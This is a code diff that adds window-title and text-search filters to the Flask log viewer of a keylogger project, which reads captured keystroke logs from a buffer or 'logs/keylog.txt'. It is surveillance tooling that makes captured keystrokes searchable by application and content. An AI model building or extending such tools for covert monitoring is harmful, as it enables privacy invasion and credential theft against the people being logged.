@@ -157,8 +157,10 @@ def create_web_app(keylogger_core, config_manager):
             page = request.args.get('page', 1, type=int)
             per_page = request.args.get('per_page', 50, type=int)
             event_type = request.args.get('type', '')
+            window_filter = request.args.get('window', '')
+            q = request.args.get('q', '')
             
-            logs_data = _get_recent_logs(page, per_page, event_type)
+            logs_data = _get_recent_logs(page, per_page, event_type, window_filter, q)
             
             return render_template('logs.html', 
                                  logs=logs_data['logs'],
@@ -166,7 +168,7 @@ def create_web_app(keylogger_core, config_manager):
         except Exception as e:
             logger.exception("Error loading logs")
             return render_template('error.html', error_title='Logs Error', error_message=str(e))
-    
+
     @app.route('/api/logs')
     @login_required
     def api_logs():
@@ -175,8 +177,10 @@ def create_web_app(keylogger_core, config_manager):
             page = request.args.get('page', 1, type=int)
             per_page = request.args.get('per_page', 50, type=int)
             event_type = request.args.get('type', '')
+            window_filter = request.args.get('window', '')
+            q = request.args.get('q', '')
             
-            return jsonify(_get_recent_logs(page, per_page, event_type))
+            return jsonify(_get_recent_logs(page, per_page, event_type, window_filter, q))
         except Exception as e:
             logger.exception("Error in logs API")
             return jsonify({'error': str(e)}), 500
@@ -355,45 +359,67 @@ def create_web_app(keylogger_core, config_manager):
             logger.exception("Error getting recent activity")
             return []
     
-    def _get_recent_logs(page: int = 1, per_page: int = 50, event_type: str = '') -> Dict[str, Any]:
-        """Get recent logs with pagination."""
+    def _get_recent_logs(page: int = 1, per_page: int = 50, event_type: str = '', window: str = '', q: str = '') -> Dict[str, Any]:
+        """Get recent logs with pagination and filtering.
+        Supports:
+        - event_type: substring match on the event type field (case-insensitive)
+        - window: substring match on the window/application field if available (case-insensitive)
+        - q: substring match on the message/details field (case-insensitive)
+        """
         try:
+            et_filter = (event_type or '').strip().lower()
+            win_filter = (window or '').strip().lower()
+            q_filter = (q or '').strip().lower()
+
+            def parse_entry(entry_str: str) -> Dict[str, Any]:
+                # Try JSON first
+                try:
+                    obj = json.loads(entry_str)
+                    if isinstance(obj, dict):
+                        ts = obj.get('timestamp') or obj.get('time') or ''
+                        et = obj.get('type') or obj.get('event_type') or 'Log'
+                        msg = obj.get('message') or obj.get('data') or ''
+                        win = obj.get('window') or obj.get('application') or obj.get('window_title') or ''
+                        return {'timestamp': ts, 'type': et, 'message': msg, 'window': win}
+                except Exception:
+                    pass
+                # Fallback legacy: "timestamp: event_type: message"
+                parts = entry_str.split(': ', 2)
+                if len(parts) >= 3:
+                    return {'timestamp': parts[0], 'type': parts[1], 'message': parts[2], 'window': ''}
+                return {
+                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+                    'type': 'Log',
+                    'message': entry_str,
+                    'window': ''
+                }
+
+            def apply_filters(item: Dict[str, Any]) -> bool:
+                if et_filter and et_filter not in str(item.get('type', '')).lower():
+                    return False
+                if win_filter and win_filter not in str(item.get('window', '')).lower():
+                    return False
+                if q_filter and q_filter not in str(item.get('message', '')).lower():
+                    return False
+                return True
+
+            def sort_key(item: Dict[str, Any]):
+                # Best-effort sort by timestamp string
+                return item.get('timestamp', '')
+
             # Try to get from logging manager buffer first
             if hasattr(keylogger_core, 'logging_manager'):
                 buffer_entries = keylogger_core.logging_manager.get_buffer_entries()
                 if buffer_entries:
-                    # Parse and format buffer entries
                     logs = []
                     for entry in buffer_entries:
-                        # Parse log entry format: "timestamp: event_type: message"
-                        parts = entry.split(': ', 2)
-                        if len(parts) >= 3:
-                            timestamp_str = parts[0]
-                            event_type_parsed = parts[1]
-                            message = parts[2]
-                        else:
-                            timestamp_str = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-                            event_type_parsed = 'Unknown'
-                            message = entry
-                        
-                        # Filter by event type if specified
-                        if event_type and event_type.lower() not in event_type_parsed.lower():
-                            continue
-                        
-                        logs.append({
-                            'timestamp': timestamp_str,
-                            'type': event_type_parsed,
-                            'message': message
-                        })
-                    
-                    # Sort by timestamp (newest first)
-                    logs.sort(key=lambda x: x['timestamp'], reverse=True)
-                    
-                    # Pagination
+                        item = parse_entry(entry)
+                        if apply_filters(item):
+                            logs.append(item)
+                    logs.sort(key=sort_key, reverse=True)
                     start_idx = (page - 1) * per_page
                     end_idx = start_idx + per_page
                     paginated_logs = logs[start_idx:end_idx]
-                    
                     return {
                         'logs': paginated_logs,
                         'pagination': {
@@ -403,54 +429,25 @@ def create_web_app(keylogger_core, config_manager):
                             'pages': (len(logs) + per_page - 1) // per_page
                         }
                     }
-            
+
             # Try to read from log file if buffer is empty
             try:
-                log_file_path = keylogger_core.config.get('logging.file_path', 'logs/keylog.txt')
+                log_file_path = keylogger_core.config.get('logging.file_path', 'logs/keylog.txt') if hasattr(keylogger_core, 'config') else 'logs/keylog.txt'
                 if os.path.exists(log_file_path):
                     with open(log_file_path, 'r', encoding='utf-8') as f:
                         lines = f.readlines()
-                    
                     logs = []
                     for line in lines[-1000:]:  # Get last 1000 lines
                         line = line.strip()
                         if not line:
                             continue
-                        
-                        # Parse log line format
-                        if ': ' in line:
-                            parts = line.split(': ', 2)
-                            if len(parts) >= 3:
-                                timestamp_str = parts[0]
-                                event_type_parsed = parts[1]
-                                message = parts[2]
-                            else:
-                                timestamp_str = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-                                event_type_parsed = 'Log'
-                                message = line
-                        else:
-                            timestamp_str = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-                            event_type_parsed = 'Log'
-                            message = line
-                        
-                        # Filter by event type if specified
-                        if event_type and event_type.lower() not in event_type_parsed.lower():
-                            continue
-                        
-                        logs.append({
-                            'timestamp': timestamp_str,
-                            'type': event_type_parsed,
-                            'message': message
-                        })
-                    
-                    # Sort by timestamp (newest first)
-                    logs.sort(key=lambda x: x['timestamp'], reverse=True)
-                    
-                    # Pagination
+                        item = parse_entry(line)
+                        if apply_filters(item):
+                            logs.append(item)
+                    logs.sort(key=sort_key, reverse=True)
                     start_idx = (page - 1) * per_page
                     end_idx = start_idx + per_page
                     paginated_logs = logs[start_idx:end_idx]
-                    
                     return {
                         'logs': paginated_logs,
                         'pagination': {
@@ -462,7 +459,7 @@ def create_web_app(keylogger_core, config_manager):
                     }
             except Exception as e:
                 logger.exception("Error reading log file")
-            
+
             # Fallback to empty data
             return {
                 'logs': [],
